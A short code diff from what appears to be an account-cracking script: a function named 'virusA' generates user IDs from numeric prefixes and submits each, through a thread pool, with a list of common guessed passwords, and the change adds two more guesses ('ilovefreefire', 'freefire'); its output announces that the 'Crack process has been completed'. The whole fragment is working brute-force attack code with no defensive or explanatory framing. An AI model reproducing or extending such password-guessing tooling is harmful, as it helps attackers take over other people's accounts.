@@ -242,7 +242,7 @@ def virusA():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','sadiya','Sadiya']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','sadiya','Sadiya','ilovefreefire','freefire']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
